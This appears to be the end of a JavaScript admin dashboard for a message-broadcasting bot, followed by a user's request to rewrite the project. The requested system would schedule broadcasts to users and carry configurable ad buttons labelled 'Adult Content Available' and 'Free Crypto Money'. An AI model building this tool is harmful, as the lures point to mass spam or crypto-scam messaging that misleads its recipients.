                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="3" width="18" height="18" rx="2"/>
                                    <circle cx="8.5" cy="8.5" r="1.5"/>
                                    <path d="M21 15l-5-5L5 21"/>
                                </svg>
                            </div>
                            <div class="empty-title">No Content Set</div>
                            <div class="empty-text">Upload media and add caption to see preview</div>
                        </div>
                    `;
                    return;
                }

                let html = '<div class="preview-box">';
                if (photoFile) {
                    // Served by the admin blueprint's /uploads route
                    html += `<img src="uploads/${photoFile}" class="preview-image" alt="Broadcast">`;
                }
                if (data.caption) {
                    html += `<div class="preview-caption">${escapeHtml(data.caption)}</div>`;
                }
                html += `
                    <div class="preview-meta">
                        <div class="preview-meta-item">Interval: <span>${data.interval_minutes || (data.interval / 60)} min</span></div>
                        <div class="preview-meta-item">Status: <span>${data.ads_enabled ? 'Active' : 'Paused'}</span></div>
                    </div>
                    </div>
                `;
                container.innerHTML = html;
            } catch (e) {
                showToast('Failed to load preview', 'error');
            }
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Refresh stats every 30 seconds (global window.setInterval, no longer shadowed)
        window.setInterval(async () => {
            try {
                const response = await fetch(`${API_BASE}/stats/refresh`);
                const data = await response.json();

                document.getElementById('statTotal').textContent = data.total_users;
                document.getElementById('statActive').textContent = data.active_users;
                document.getElementById('statMessages').textContent = data.total_ads_sent;
                document.getElementById('quickSessions').textContent = data.active_sessions || 0;
                document.getElementById('quickPending').textContent = data.pending_msgs || 0;
                document.getElementById('quickOnline').textContent = data.online_users || 0;
                document.getElementById('quickIdle').textContent = data.idle_users || 0;
            } catch (e) {
                console.error('Stats refresh failed:', e);
            }
        }, 30000);
    </script>
</body>
</html>

Please implement the following changes and rewrite the entire project with the updated functionality.1. Custom Broadcast Time Interval- Allow the admin to select a custom time interval for broadcasts, such as 5 minutes, 10 minutes, 30 minutes, or any other duration.- For example, if the admin selects a 10-minute interval and starts the broadcast, the first broadcast should begin after 10 minutes.- After that, broadcasts should continue automatically at the selected interval.- The broadcast system must follow the selected interval accurately.- Provide options to start, stop, and manage broadcasts.2. Advertisement Management- Add a Reset Ads button in the admin panel.- When clicked, it should allow the admin to remove or reset all configured advertisements.- Provide proper confirmation before resetting to prevent accidental deletion.- Allow the admin to add, edit, and delete advertisements whenever needed.3. Custom Advertisement ButtonsAllow the admin to configure two separate advertisement buttons.Advertisement 1- Button Name: "Adult Content Available"- Allow the admin to customize the text displayed above the button.- Allow the admin to edit the button name.- Allow the admin to configure what happens when a user clicks the button, such as opening a URL or redirecting to a specified destination.Advertisement 2- Button Name: "Free Crypto Money"- Allow the admin to customize the text displayed above the button.- Allow the admin to edit the button name.- Allow the admin to configure what happens when a user clicks the button, such as opening a URL or redirecting to a specified destination.4. Advertisement Layout- Display the custom text above each advertisement button.- Place the buttons directly below their respective advertisement text.- Display both advertisement sections beneath the main advertisement or broadcast message.- Maintain a clean, organized, and user-friendly layout.- Ensure that each button opens its own independently configured destination.5. Admin ControlsAdd an admin panel that allows the administrator to:- Configure broadcast intervals.- Start and stop broadcasts.- Add, edit, and delete advertisement messages.- Customize advertisement button names.- Edit the text displayed above each button.- Configure or change the destination URL for each button.- Reset all advertisements when required.- Save changes and apply them without manually modifying the source code.6. Important Requirements- Make all advertisement content, button labels, destination URLs, and broadcast intervals configurable through the admin panel.- Ensure that the selected broadcast interval is respected, including the initial delay before the first broadcast.- Validate URLs and time intervals before saving.- Prevent duplicate broadcast jobs from running simultaneously.- Ensure that stopping the broadcast cancels future scheduled broadcasts.- Make the reset functionality reliable and provide confirmation before deleting configured advertisements.- Keep the existing project functionality intact unless a change is necessary.- Rewrite the entire codebase with the updated features, ensuring that all files work together correctly.- Provide the complete updated source code, project structure, dependencies, and deployment instructions.- Do not provide incomplete snippets or leave out any required files.Final Goal: Build a fully configurable broadcasting and advertisement management system in which the admin can control broadcast timing, customize two advertisement sections, edit their button labels and destinations, and reset advertisements whenever necessary—all through the admin panel.